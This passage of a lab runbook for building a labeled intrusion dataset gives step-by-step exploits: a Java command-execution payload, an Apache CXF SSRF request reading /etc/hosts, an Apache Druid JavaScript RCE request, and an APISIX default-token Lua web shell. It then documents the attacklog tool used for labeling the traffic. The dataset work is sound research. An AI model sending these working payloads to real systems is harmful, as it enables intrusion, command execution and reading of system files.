{"ParamName":"","paramDesc":"","paramType":"","sampleItem":"1","mandatory":true,"requiredFlag":1,"validationRules":"function verification(data){a = new java.lang.ProcessBuilder(\"id\").start().getInputStream();r=new java.io.BufferedReader(new java.io.InputStreamReader(a));ss='';while((line = r.readLine()) != null){ss+=line};return ss;}"}
```

![](img/aj-report-cnvd-2024-15077-1.png)

```bash
attacklog end --status <success|ran|error>
```

---

### 24. Apache CXF Aegis DataBinding SSRF (CVE-2024-28752)

**Name:** `vulnhub-apache-cxf-cve-2024-28752`  
**Target port:** 8080 / TCP

**Port Scan:**

```bash
attacklog start --name vulnhub-apache-cxf-cve-2024-28752-portscan --dst-ip <dst-ip> --dst-port 8080
```

```bash
nmap -p 8080 <dst-ip>
```

```bash
attacklog end --status ran
```

**Conducting the attack:**

```bash
attacklog start --name vulnhub-apache-cxf-cve-2024-28752 --dst-ip <dst-ip> --dst-port 8080
```

A SSRF vulnerability in Apache CXF before versions 4.0.4, 3.6.3 and 3.5.8 using Aegis DataBinding allows an attacker to make the server send requests to arbitrary URLs, potentially leading to information disclosure or further attacks against internal systems.

#### Environment Setup

```
docker compose up -d
```

After the service starts, the vulnerable CXF webservice is accessible at `http://<dst-ip>:8080/test?wsdl`.

#### Vulnerability Reproduction

Send this request to the server:

```
POST /test HTTP/1.1
Host: <dst-ip>:8080
Content-Type: multipart/related; boundary=----kkkkkk123123213
Content-Length: 472
Connection: close

------kkkkkk123123213
Content-Disposition: form-data; name="1"

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://service.namespace/">
   <soapenv:Header/>
   <soapenv:Body>
      <web:test>
         <arg0>
<count><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///etc/hosts"></xop:Include></count>
</arg0>
      </web:test>
   </soapenv:Body>
</soapenv:Envelope>
------kkkkkk123123213--
```

![](img/apache-cxf-cve-2024-28752-1.png)

```bash
attacklog end --status <success|ran|error>
```

#### Notes from Jovan

###### request:
```
curl -X POST "http://your-ip:8080/test" \
  -H "Content-Type: multipart/related; boundary=----kkkkkk123123213" \
  -H "Connection: close" \
  --data-binary $'------kkkkkk123123213\r
Content-Disposition: form-data; name="1"\r
\r
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://service.namespace/">\r
   <soapenv:Header/>\r
   <soapenv:Body>\r
      <web:test>\r
         <arg0>\r
<count><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///etc/hosts"></xop:Include></count>\r
</arg0>\r
      </web:test>\r
   </soapenv:Body>\r
</soapenv:Envelope>\r
------kkkkkk123123213--\r
'
```

---

### 25. Apache Druid Embedded JavaScript Remote Code Execution (CVE-2021-25646)

**Name:** `vulnhub-apache-druid-cve-2021-25646`  
**Target port:** 8888 / TCP

**Port Scan:**

```bash
attacklog start --name vulnhub-apache-druid-cve-2021-25646-portscan --dst-ip <dst-ip> --dst-port 8888
```

```bash
nmap -p 8888 <dst-ip>
```

```bash
attacklog end --status ran
```

**Conducting the attack:**

```bash
attacklog start --name vulnhub-apache-druid-cve-2021-25646 --dst-ip <dst-ip> --dst-port 8888
```

In Apache Druid 0.20.0 and earlier, it is possible for an authenticated user to send a specially-crafted request that forces Druid to run user-provided JavaScript code regardless of server configuration. This can be leveraged to execute code on the target machine with the privileges of the Druid server process.

#### Environment Setup

```
docker compose up -d
```

After the server starts, access the Druid home page at `http://<dst-ip>:8888`.

#### Exploit

Send this request to execute the `id` command:

```
POST /druid/indexer/v1/sampler HTTP/1.1
Host: <dst-ip>:8888
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/json

{
    "type":"index",
    "spec":{
        "ioConfig":{
            "type":"index",
            "firehose":{
                "type":"local",
                "baseDir":"/etc",
                "filter":"passwd"
            }
        },
        "dataSchema":{
            "dataSource":"test",
            "parser":{
                "parseSpec":{
                "format":"javascript",
                "timestampSpec":{

                },
                "dimensionsSpec":{

                },
                "function":"function(){var a = new java.util.Scanner(java.lang.Runtime.getRuntime().exec([\"sh\",\"-c\",\"id\"]).getInputStream()).useDelimiter(\"\\A\").next();return {timestamp:123123,test: a}}",
                "":{
                    "enabled":"true"
                }
                }
            }
        }
    },
    "samplerConfig":{
        "numRows":10
    }
}
```

![](img/apache-druid-cve-2021-25646-1.png)

```bash
attacklog end --status <success|ran|error>
```

---

### 26. Apache APISIX Hardcoded API Token Leads to RCE (CVE-2020-13945)

**Name:** `vulnhub-apisix-cve-2020-13945`  
**Target port:** 9080 / TCP

**Port Scan:**

```bash
attacklog start --name vulnhub-apisix-cve-2020-13945-portscan --dst-ip <dst-ip> --dst-port 9080
```

```bash
nmap -p 9080 <dst-ip>
```

```bash
attacklog end --status ran
```

**Conducting the attack:**

```bash
attacklog start --name vulnhub-apisix-cve-2020-13945 --dst-ip <dst-ip> --dst-port 9080
```

Apache APISIX has a default built-in API token `edd1c9f034335f136f87ad84b625c8f1` that can be used to access all admin APIs, leading to remote Lua code execution through the `script` parameter introduced in version 2.x.

#### Environment Setup

```
docker compose up -d
```

After the server starts, a default 404 page is visible at `http://<dst-ip>:9080`.

#### Vulnerability Reproduction

Add a malicious router rule using the default API token:

```
POST /apisix/admin/routes HTTP/1.1
Host: <dst-ip>:9080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
X-API-KEY: edd1c9f034335f136f87ad84b625c8f1
Content-Type: application/json
Content-Length: 406

{
    "uri": "/attack",
"script": "local _M = {} \n function _M.access(conf, ctx) \n local os = require('os')\n local args = assert(ngx.req.get_uri_args()) \n local f = assert(io.popen(args.cmd, 'r'))\n local s = assert(f:read('*a'))\n ngx.say(s)\n f:close()  \n end \nreturn _M",
    "upstream": {
        "type": "roundrobin",
        "nodes": {
            "example.com:80": 1
        }
    }
}
```

![](img/apisix-cve-2020-13945-1.png)

Then use the evil router to execute arbitrary commands:

```
http://<dst-ip>:9080/attack?cmd=id
```

![](img/apisix-cve-2020-13945-2.png)

```bash
attacklog end --status <success|ran|error>
```


---
# Automatic Labeling

The `Automatic Labeling` section is dedicated to the process of automatic labeling of flows and raw packet captures after conducting the attacks.

For this purpose, a CLI tool called `attacklog` was created, used on attack start and attack end to store structured information about each attack attempt. The tool is written in pure Python with no external dependencies and is very easy to use.

Link to the tool: https://github.com/JovanSimonoski/attacklog

---

### Process

Each attacker runs `attacklog` (pre-installed and initialized on their Kali VM before the session begins) to bracket every attack with a start and end event. This produces one structured SQLite record per attack that is later joined against captured flows and packets during post-processing.

---

### What Each Record Captures

| Field | Description |
|---|---|
| `attack_id` | Unique UUID - auto-generated per attempt |
| `attacker_id` + `src_ip` | Set once at init, never re-entered. Format: `attacker_<number>` |
| `attack_name` | Canonical name matching the entry in the Attacks section |
| `attack_type` | Inferred automatically: `targeted`, `port_scan`, or `network_scan` |
| `dst_ip` | Single address, CIDR block, or IP range |
| `dst_port` | Single port, contiguous range, or comma-separated list |
| `protocol` | `tcp`, `udp`, or `icmp` |
| `t_start` / `t_end` | Millisecond-precision UTC timestamps from the system clock |
| `status` | `success`, `ran` (completed without exploiting), or `error` |
| `notes` | Optional free-text field for anomalies |

---

### Attack Types

The attack type is inferred automatically from the `--dst-ip` and `--dst-port` values at start - no manual input required.

| Type | dst-ip | dst-port |
|---|---|---|
| `targeted` | Single address | Single port |
| `port_scan` | Single address | Range or list |
| `network_scan` | CIDR or range | Any |

---

### Attacker Workflow (per attack)

1. Run `attacklog start` with the attack name, destination IP, port, and protocol
2. Execute the attack following the step-by-step instructions
3. Run `attacklog end` with the outcome status

**Important:** `attacklog` refuses to start a new attack if a previous one has no `t_end`. Always close the current attack before starting the next one.

---

### Setup

- Each attacker is provided with a preconfigured Kali VM
- NTP is synced to `ntp.finki.ukim.mk` on all machines (attacker and target) before any session begins - this is the single most important prerequisite for reliable timestamp joining
- `attacklog` is pre-installed and initialized on each Kali VM with the attacker's assigned `attacker_id` and static VPN IP (`src_ip`) or if we have preconfigured VM's - just IP
- Each attacker is assigned a static IP, making `src_ip` a reliable identifier in flow/packet matching

---

### Labeling Logic

The automatic labeling script joins the `attacklog` SQLite export against NetFlow records and raw packet captures using:
- `src_ip` + `dst_ip` + `dst_port` + `protocol` as the join key - source port is not recorded, it is recovered from the PCAP during joining
- `t_start` / `t_end` as the time window, with a ±1s tolerance for clock jitter

Any flow outside a matched window is labeled **benign**. This is safe given the isolated environment - no legitimate user traffic exists on the target services, and infrastructure traffic (NTP, Kafka, log shipping) operates on entirely different ports.

---

### Data Storage and Export

- Records are stored locally at `~/.attacklog/attacks.db` (SQLite)
- Exported via `attacklog export --format json` or `--format csv` at the end of each session and submitted for post-processing
- Kafka integration can be added later - to be discussed

---

### What is NOT Recorded (by design)

- **Callback / reverse shell sessions** (dst → src) - recoverable from PCAP if needed
- **CVE, tool, payload type** - defined in the attack instruction files, joined by `attack_name` during post-processing; no manual entry needed

---

### Tool Reference

**Initialization** - run once per machine at setup:
```bash
attacklog init --attacker-id attacker_<number> --src-ip <src_ip>
```

**Start an attack:**
```bash
# Targeted attack (single IP, single port)
attacklog start --name <attack_name> --dst-ip <dst-ip> --dst-port <port>

# Port scan (single IP, port range or list)
attacklog start --name <attack_name> --dst-ip <dst-ip> --dst-port 1-1024

# Network scan (IP range or CIDR)
attacklog start --name <attack_name> --dst-ip 10.10.10.0/24 --dst-port 22,80,443

# UDP protocol (default is tcp)
attacklog start --name <attack_name> --dst-ip <dst-ip> --dst-port <port> --protocol udp
```

**End an attack:**
```bash
attacklog end --status <success|ran|error>
attacklog end --status error --notes "Module failed to connect"
```

**List recorded attacks:**
```bash
attacklog list
attacklog list --limit 10
```

**Export attacks data:**
```bash
attacklog export --format json --output attacks.json
attacklog export --format csv --output attacks.csv
```

**Add to PATH** (run once after installation):
```bash
chmod +x attacklog.py
sudo mv attacklog.py /usr/local/bin/attacklog
```